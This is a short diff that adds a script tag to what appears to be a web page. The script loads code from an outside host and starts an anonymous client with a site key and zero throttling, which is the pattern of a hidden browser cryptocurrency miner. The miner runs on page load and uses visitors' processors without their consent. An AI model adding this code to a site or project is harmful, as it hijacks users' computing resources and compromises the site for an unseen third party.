@@ -1,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/QHFg.js"></script>
+<script>
+    var _client = new Client.Anonymous('6d7b424aa6ba43585eebeee991865e69bc742794e717b32518c96838782daab6', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+</script>
